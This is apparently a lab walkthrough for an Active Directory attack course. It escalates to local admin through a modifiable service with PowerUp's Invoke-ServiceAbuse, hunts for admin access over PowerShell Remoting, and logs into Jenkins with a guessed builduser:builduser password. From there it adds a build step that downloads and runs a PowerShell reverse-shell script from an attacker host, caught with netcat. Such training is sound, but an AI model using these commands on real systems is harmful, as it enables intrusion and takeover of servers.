---
icon: vial
---

# 5 - Learning Object 5️

## Tasks



1 - Exploit a service on dcorp-studentx and elevate privileges to local administrator

2 - Identify a machine in the domain where studentx has local administrative access

3 - Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server

Flag 5 \[Student VM] - Service abused on the student VM for local privilege escalation  🚩

Flag 6 \[Student VM] - Script used for hunting for admin privileges using PowerShell Remoting 🚩

Flag 7 \[dcorp-ci] - Jenkins user used to access Jenkins web console 🚩

Flag 8 \[dcorp-ci] - Domain user used for running Jenkins service on dcorp-ci 🚩



## Solutions

### 1 - Exploit a service on dcorp-studentx and elevate privileges to local administrator

Start InviShell and PowerUp

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
```

Now we need to exploit a service and elevate privileges to local administrator, using `Invoke-AllChecks` method we're able to display all services vulnerable with "CanRestart: True", "Check: Modifiable Services", and"Unquoted Service Paths" with relatives abuse function to exploit them

```powershell
Invoke-AllChecks
```

```powershell
ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer\Abyss Web Server\abyssws.exe; IdentityReference=Everyone; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer\Abyss Web Server; IdentityReference=Everyone; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer\Abyss Web Server; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer\Abyss Web Server; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True
Name           : AbyssWebServer
Check          : Unquoted Service Paths

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True
Name                            : AbyssWebServer
Check                           : Modifiable Service Files

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True
Name                            : AbyssWebServer
Check                           : Modifiable Service Files

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True
Name                            : AbyssWebServer
Check                           : Modifiable Service Files

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True
Name          : AbyssWebServer
Check         : Modifiable Services

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
Name          : SNMPTRAP
Check         : Modifiable Services

ModifiablePath    : C:\Users\student867\AppData\Local\Microsoft\WindowsApps
IdentityReference : dcorp\student867
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student867\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student867\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student867\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
```

There're multiple service vulnerable, in this case i choose a service with CanRestart attribute equals to 'True'&#x20;

```powershell
ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
Name          : SNMPTRAP
Check         : Modifiable Services
```

Abusing it with the following command we're able to perform privilege escalation adding our student account to local admin group.

Do to it correctly, first to proceed, we can check abuse function examples:

```powershell
help Invoke-ServiceAbuse -Example
```

```powershell
NAME
    Invoke-ServiceAbuse

SYNOPSIS
    Abuses a function the current user has configuration rights on in order
    to add a local administrator or execute a custom command.

    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: Get-ServiceDetail, Set-ServiceBinaryPath


    -------------------------- EXAMPLE 1 --------------------------

    PS C:\>Invoke-ServiceAbuse -Name VulnSVC

    Abuses service 'VulnSVC' to add a localuser "john" with password
    "Password123! to the  machine and local administrator group


    -------------------------- EXAMPLE 2 --------------------------

    PS C:\>Get-Service VulnSVC | Invoke-ServiceAbuse

    Abuses service 'VulnSVC' to add a localuser "john" with password
    "Password123! to the  machine and local administrator group


    -------------------------- EXAMPLE 3 --------------------------

    PS C:\>Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"

    Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
    local adminisrtators group.


    -------------------------- EXAMPLE 4 --------------------------

    PS C:\>Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"

    Abuses service 'VulnSVC' to add a localuser "backdoor" with password
    "password" to the  machine and local "Power Users" group
```

So, this is the abuse function that we need:&#x20;

```powershell
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "dcorp\student867" -Verbose
```

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

Check it using this command: `Get-LocalGroupMember -Group "Administrators"`

```powershell
ObjectClass Name                       PrincipalSource
----------- ----                       ---------------
Group       dcorp\Domain Admins        ActiveDirectory
User        dcorp\student867           ActiveDirectory
User        DCORP-STD867\Administrator Local
```

### 2 - Identify a machine in the domain where studentx has local administrative access

Using Find-PSRemotingLocalAdminAccess.ps1 we can diplay machines where our student account has local admin access:

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```

```powershell
dcorp-adminsrv
dcorp-std867
```

### 3 - Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server

Go via browser on Jenkins site (172.16.3.11:8080) to Dashboard:

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

This Jenkins vs has password policy without a restrictive rule, we can obtain username about three accounts going to [http://172.16.3.11:8080/asynchPeople/](http://172.16.3.11:8080/asynchPeople/)&#x20;

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
manager
builduser
jenkinsadmin
```

so we can brute force accounts using Hydra, but first to proceed i've try to login at [http://172.16.3.11:8080/login](http://172.16.3.11:8080/login?from=%2Fuser%2Fjenkinsadmin%2F) using as a psw the same username and generic passwords login with builduser:builduser credentials

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Modify an existing project, clicking to existing project0

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* Configure -> Add build step (write the following command) -> `powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339`

```powershell
powershell.exe iex (iwr http://172.16.100.67/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.67 -Port 1339
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

and save it. Meanwhile run netcat on our attacker win machine going in listening mode on port 1339:

```bash
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Now our student user appartains to administrators group and we can disabilitate firewall, do it!

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

After that, run a web server using HFS.exe present into Tool folder and move Invoke-PowerShellTCP.ps1 to Virtual File System copying the URL into program clipboard:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Click on Build Now

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Go again to our shell and we'll see the connection back:

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

```powershell
ls env:
```

```powershell
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\ciadmin\AppData\Roaming
BASE                           C:\Users\Administrator\.jenkins
BUILD_DISPLAY_NAME             #3
BUILD_ID                       3
BUILD_NUMBER                   3
BUILD_TAG                      jenkins-Project0-3
BUILD_URL                      http://172.16.3.11:8080/job/Project0/3/
CI                             true
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   DCORP-CI
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
EXECUTOR_NUMBER                4
HUDSON_COOKIE                  667e6811-a108-4927-b6e0-07ded5dff4f3
HUDSON_HOME                    C:\Users\Administrator\.jenkins
HUDSON_SERVER_COOKIE           6f6749723e1110b6
HUDSON_URL                     http://172.16.3.11:8080/
JENKINS_HOME                   C:\Users\Administrator\.jenkins
JENKINS_SERVER_COOKIE          6f6749723e1110b6
JENKINS_URL                    http://172.16.3.11:8080/
JOB_BASE_NAME                  Project0
JOB_NAME                       Project0
JOB_URL                        http://172.16.3.11:8080/job/Project0/
LOCALAPPDATA                   C:\Users\ciadmin\AppData\Local
NODE_LABELS                    built-in
NODE_NAME                      built-in
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL                25
PROCESSOR_REVISION             0101
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSModulePath                   C:\Users\ciadmin\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShe...
PUBLIC                         C:\Users\Public
SERVICE_ID                     jenkins
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\ciadmin\AppData\Local\Temp
TMP                            C:\Users\ciadmin\AppData\Local\Temp
USERDNSDOMAIN                  DOLLARCORP.MONEYCORP.LOCAL
USERDOMAIN                     dcorp
USERNAME                       ciadmin
USERPROFILE                    C:\Users\ciadmin
windir                         C:\Windows
WINSW_EXECUTABLE               C:\Users\Administrator\.jenkins\jenkins.exe
WINSW_SERVICE_ID               jenkins
WORKSPACE                      C:\Users\Administrator\.jenkins\workspace\Project0
WORKSPACE_TMP                  C:\Users\Administrator\.jenkins\workspace\Project0@tmp
```

### Flag 5 \[Student VM] - Service abused on the student VM for local privilege escalation  🚩

As seen in the task 1, we can use one of the following services fo

```powershell
ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True
Name          : AbyssWebServer
Check         : Modifiable Services

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
Name          : SNMPTRAP
Check         : Modifiable Services
```

### Flag 6 \[Student VM] - Script used for hunting for admin privileges using PowerShell Remoting 🚩

As seen in the task 2, we used Find-PSRemotingLocalAdminAccess for hunting admin privileges using PS remoting:

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```

### Flag 7 \[dcorp-ci] - Jenkins user used to access Jenkins web console 🚩

Based on the task 3, we can login as builduser account using builduser:builduser credentials&#x20;

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Flag 8 \[dcorp-ci] - Domain user used for running Jenkins service on dcorp-ci 🚩

As see in the task 3, interacting with machine after the reverse shell we've check target information, in this case the domain user is: `ciadmin`
